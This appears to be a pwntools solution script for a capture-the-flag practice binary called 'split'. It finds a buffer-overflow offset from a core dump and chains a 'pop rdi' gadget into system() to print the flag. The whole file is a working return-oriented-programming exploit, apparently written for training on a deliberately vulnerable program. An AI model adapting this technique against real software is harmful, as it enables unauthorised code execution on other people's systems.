from pwn import *

p = process("./split")
e = ELF("./split")

# Crash the program
p.recvuntil(b">")
p.sendline(cyclic(50))
p.wait()

# Read the corefile to find offset to RIP
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))

# Find ROP-Gadgets
rop = ROP(e)
pop_rdi = p64(rop.rdi.address)
system = p64(e.symbols["system"])
command = p64(e.symbols["usefulString"])

# Craft payload
payload = b'A' * offset
payload += pop_rdi
payload += command
payload += system

# Get flag
p = process("./split")
p.recvuntil(b">")
p.sendline(payload)
print(p.recvall().decode())
